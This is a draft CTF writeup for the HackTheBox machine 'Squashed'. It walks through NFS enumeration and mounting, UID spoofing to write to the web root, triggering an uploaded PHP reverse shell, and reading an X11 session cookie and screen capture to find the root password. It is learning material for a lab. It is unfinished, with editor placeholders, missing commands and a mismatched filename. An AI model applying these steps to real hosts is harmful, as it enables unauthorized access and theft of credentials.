---
layout: post                                                                 
title: "HTB Writeup: Squashed"                                     
date: 2023-03-12 09:00:00 -0500                                              
description: Squashed is an easy HackTheBox machine created by polarbearer and C4rm310. It involves exploiting NFS, a webserver, and X11.
img: squashed/squashed.png                                                 
tags: [HackTheBox, HTB, Writeup, Squashed, NFS, X11]
---

Squashed is an easy HackTheBox machine created by [polarbearer](https://app.hackthebox.com/users/159204) and C4rm310. It involves exploiting NFS, a webserver, and X11. 

# Reconnaissance 

To start this box, let's run a Nmap scan. The Nmap scan reveals the ports for SSH (22), HTTP (80), RPC (111), and NFS (2049) are open.

_Note: I added the machine's IP to my /etc/hosts file._

```
nmap -sC -sV squashed.htb -oN top_1000                                     

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33327/udp6  mountd
|   100005  1,2,3      40437/tcp   mountd
|   100005  1,2,3      41841/tcp6  mountd
|   100005  1,2,3      52431/udp   mountd
|   100021  1,3,4      33915/tcp6  nlockmgr
|   100021  1,3,4      36863/tcp   nlockmgr
|   100021  1,3,4      48865/udp   nlockmgr
|   100021  1,3,4      53794/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## The Website
We continue our recon by looking at the website. It appears to be static. There is not anything for us to do here yet. Let's move on to NFS.

![Website]({{site.baseurl}}/assets/img/squashed/website.png)

## NFS
Network File System (NFS) is a server that allows for the transfer of files between machines. It works on a direcory system. It is commonly exploited due to weak authorization and authentication. 

### Enumerating NFS
We can view the file shares by using the `showmount` command.

```
showmount -e squashed.htb

Export list for squashed.htb:
/home/ross    *
/var/www/html *
```

There are two shares available. We can mount them to our system like this:
```
# create directories for the shares
sudo mkdir /mnt/webshare                                                     
sudo mkdir /mnt/ross                                                         

# mount the shares
sudo mount -t nfs squashed.htb:/var/www/html /mnt/webshare
sudo mount -t nfs squashed.htb:/home/ross /mnt/ross
```
Let's start by investigating the webshare.

### Investigating The Webshare

```
ls -la /mnt/webshare                                                        

ls: cannot access '/mnt/webshare/.': Permission denied
ls: cannot access '/mnt/webshare/..': Permission denied
ls: cannot access '/mnt/webshare/.htaccess': Permission denied
ls: cannot access '/mnt/webshare/index.html': Permission denied
ls: cannot access '/mnt/webshare/images': Permission denied
ls: cannot access '/mnt/webshare/css': Permission denied
ls: cannot access '/mnt/webshare/js': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? .htaccess
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js
```

```
ls -ld /mnt/webshare/                                                        

drwxr-xr-- 5 2017 www-data 4096 Mar 14 09:45 /mnt/webshare/
```

### Investigating Ross' Share

```
ls -la /mnt/ross                                                             

total 68
drwxr-xr-x 14 1001 1001 4096 Mar 14 09:30 .
drwxr-xr-x  6 root   root   4096 Mar 14 09:43 ..
lrwxrwxrwx  1 root   root      9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 1001 1001 4096 Oct 21 10:57 .cache
drwx------ 12 1001 1001 4096 Oct 21 10:57 .config
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Documents
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Downloads
drwx------  3 1001 1001 4096 Oct 21 10:57 .gnupg
drwx------  3 1001 1001 4096 Oct 21 10:57 .local
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Music
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Public
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Templates
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root   root      9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 1001 1001   57 Mar 14 09:30 .Xauthority
-rw-------  1 1001 1001 2475 Mar 14 09:30 .xsession-errors
-rw-------  1 1001 1001 2475 Dec 27 10:33 .xsession-errors.old
```

# Exploiting NFS
EXPLAIN THE VULNERABILITY

create dummy account. Mine is called `webshare-squasher` but you can choose a better name for yours :wink:.

```
sudo useradd -m webshare-squasher
```
mimic the UID of 2017

```
sudo usermod -u 2017 webshare-squasher && sudo groupmod -g 2017 webshare-squasher
```
switch users

```
sudo su webshare-squasher
```

see if we have access
```
ls -la /mnt/webshare

total 56
drwxr-xr-- 5 webshare-squasher www-data  4096 Mar 14 10:00 .
drwxr-xr-x 6 root              root      4096 Mar 14 09:43 ..
drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 css
-rw-r--r-- 1 webshare-squasher www-data    44 Oct 21 06:30 .htaccess
drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 images
-rw-r----- 1 webshare-squasher www-data 32532 Mar 14 10:00 index.html
drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 js
```

we do! let's upload a php reverse shell. I'm using this one LINK TO PENTESTMONKEY's shell

access the file from the site
```
curl http://squashed.htb/shell.php
```

![Webshell]({{site.baseurl}}/assets/img/squashed/shell.png)

# Path To Root
```
cat /mnt/ross/.Xauthority | base64 
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDrUznPv+BDu3LVehkVgiZX

```
GET COMMANDS FOR THIS PART

```
w

 14:10:18 up 40 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               13:30   40:07   4.86s  0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

```
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

set up a python server in the directory you placed the screenshot and then retrieve it on your host machine.
```
curl http://squashed.htb:8000/screenshot.xwd
```

Convert the image using the `convert` commandline utility.

```
convert screenshot.xwd screenshot.png
```

it's a screenshot of a password manager! 

![Password Manager]({{site.baseurl}}/assets/img/squashed/pwd-manager.png)

Go back to your shell as alex. Use the `su` command and type in the root password to gain full access to the machine!

I hope you enjoyed this writeup! Happy Hacking :)
